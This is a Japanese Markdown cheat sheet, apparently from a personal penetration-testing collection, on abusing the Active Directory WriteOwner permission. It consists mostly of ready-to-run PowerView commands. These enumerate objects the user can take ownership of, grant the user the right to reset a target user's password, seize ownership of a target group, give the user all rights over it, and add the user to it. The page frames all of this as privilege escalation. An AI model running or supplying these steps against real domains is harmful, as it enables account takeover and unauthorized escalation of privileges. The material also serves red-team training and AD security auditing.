# WriteOwnerの悪用

この権限はオブジェクトの所有権を変更できる権限。ユーザーオブジェクトに `WriteOwner` がある場合は、そのユーザーの所有者になることができる。グループオブジェクトに対して `WriteOwner` を持っている場合、自分自身または、侵害した他のユーザーをそのグループに追加できる。ユーザー オブジェクトの所有権がある場合は、ユーザーのパスワードをリセットする`Resetpassword`権限を自分に付与して、権限を昇格することができる。

## WriteOwner on User

### Write Ownerを持つオブジェクトのリストを取得

`whoami /user` を実行して現在のユーザーの SID を取得し、`PowerView` をインポートしてから、以下のコマンドを実行して `WriteOwner` 権限を持つオブジェクトのリストを取得

```
Get-Objectacl -resolveguids | ? {($_.securityidentifier -eq "<SID>") -and ($_.activedirectoryrights -like "*WriteOwner*")}
```

### ForceChangePassword 権限を自分に付与

```
Add-DomainObjectacl -TargetIdentity <Target_User> -PrincipalIdentity <USERNAME> -Rights Resetpassword
```

### 権限が付与されているか確認

```
Get-Objectacl -resolveguids | ? {$_.securityidentifier -eq "<Target_USER_SID>"}
```

権限が付与されているとパスワードの変更ができるようになる

[ForceChangePassword](https://github.com/namahano/Cheat-Sheet/blob/main/Active%20Directory/DACL/ForceChangePassword.md)

## WriteOwner on Group

### グループにユーザーを追加

そのユーザーとしてプロセスを実行していない場合は、ターゲットユーザーを完全に制御するユーザーとしてドメインコントローラーを認証する必要があるかもしれない。`Get-DomainObject` と組み合わせてこれを行うには、まず `PSCredential` オブジェクトを作成する。

```
$SecPassword = ConvertTo-SecureString '<Password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
```

グループの `OwnerIdentity`(オブジェクトの所有者) と `PrincipalIdentity` (オブジェクトのアクセス権)を変更

```
Set-DomainObjectOwner -Identity '<Target Group>' -OwnerIdentity <USERNAME> -Cred $cred
```

オブジェクトに対してアクセス権を与える

```
Add-DomainObjectAcl -TargetIdentity "<Target Group>" -PrincipalIdentity <USERNAME> -Cred $cred -Rights All
```

ユーザーをグループに追加

```
Add-DomainGroupMember -Identity '<Target Group>' -Members '<USERNAME>' -Cred $cred
```

グループに追加されているか確認

```
net group "<Target Group>"
```





